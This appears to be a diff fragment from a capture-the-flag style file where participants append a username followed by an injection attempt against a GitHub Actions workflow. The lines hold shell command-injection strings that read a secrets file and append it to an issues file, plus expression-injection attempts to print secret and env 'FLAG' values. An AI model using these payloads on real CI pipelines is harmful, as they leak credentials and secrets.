@@ -10921,3 +10921,4 @@ zwh-china:${{ github.event.issue.number }} $( flag )
 ";echo `ls`"
 CUHKJason:";cat $HOME/secrets/my_secret.json# ; cat $HOME/secrets/my_secret.json >> issues#";#
 CUHKJason:$issues
+Zero-00000:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag"
